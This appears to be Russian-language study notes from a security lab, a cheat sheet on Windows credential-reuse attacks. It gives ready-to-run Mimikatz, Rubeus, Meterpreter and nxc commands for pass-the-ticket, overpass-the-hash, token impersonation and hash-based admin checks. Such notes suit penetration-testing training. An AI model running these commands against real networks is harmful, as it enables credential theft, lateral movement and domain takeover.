# ТЕХНИКИ CREDENTIAL REUSE

### Pass-the-Ticket (PtT)

Внедрение украденного Kerberos билета (TGT или TGS) в текущую сессию.

Когда использовать: когда NTLM ограничен, но Kerberos доступен.

**Mimikatz:**
mimikatz # kerberos::ptt ticket.kirbi

**Rubeus:**
Rubeus.exe ptt /ticket:ticket.kirbi

**Проверить внедренный билет:**
klist


### Overpass-the-Hash (Pass-the-Key)

Преобразование NT хэша в Kerberos TGT. Запрос билета через KDC с использованием хэша.

Когда использовать: когда NTLM отключен, но Kerberos работает.

**Mimikatz:**
mimikatz # sekurlsa::pth /user:Administrator /domain:thm.loc /ntlm:NTLM_HASH /run:cmd.exe

Новое окно cmd.exe будет иметь внедренный билет. Команда `klist` покажет Kerberos идентичность.


### Token Impersonation

Кража токена другого пользователя, залогиненного на той же машине. Не требует credentials — только SYSTEM доступ.

Когда использовать: когда на скомпрометированном хосте есть активная сессия Domain Admin.

**Meterpreter + Incognito:**
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"


## СРАВНЕНИЕ ТЕХНИК CREDENTIAL REUSE

| Техника | Что используется | Необходимые права | Результат |
|---------|-----------------|-------------------|-----------|
| Pass-the-Hash | NT хэш (32 hex) | Local Admin на цели | SYSTEM shell (psexec) или PowerShell (evil-winrm) |
| Pass-the-Ticket | Kerberos .kirbi файл | Текущий пользователь | Аутентификация как владелец билета |
| Overpass-the-Hash | NT хэш → TGT | Текущий пользователь | TGT в сессии, доступ к Kerberos-only сервисам |
| Token Impersonation | Токен процесса | SYSTEM | Стать любым пользователем с активным токеном |


## БЫСТРАЯ ШПАРГАЛКА

# Проверить локального админа с хэшем
nxc smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth

# Pass-the-Ticket (Mimikatz)
kerberos::ptt ticket.kirbi

# Overpass-the-Hash (Mimikatz)
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe

# Token Impersonation (Meterpreter/Incognito)
list_tokens -u
impersonate_token "DOMAIN\\Username"